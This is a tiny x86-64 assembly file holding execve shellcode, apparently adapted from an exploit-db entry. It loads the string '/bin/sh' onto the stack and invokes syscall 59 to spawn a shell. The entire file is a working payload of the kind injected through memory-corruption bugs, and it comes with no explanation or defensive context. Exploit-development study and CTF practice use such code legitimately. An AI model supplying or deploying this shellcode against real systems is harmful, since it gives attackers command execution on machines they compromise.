global _start

;orginal version taken from https://www.exploit-db.com/shellcodes/52296 
section .text

_start:
    xor eax, eax
    push rax

    mov r10, 0x68732f6e69622f ; hs/nib/
    push r10

    push rsp
    pop rdi

    push 59
    pop rax  

    xor  rsi, rsi  
    xor  rdx, rdx  
    syscall


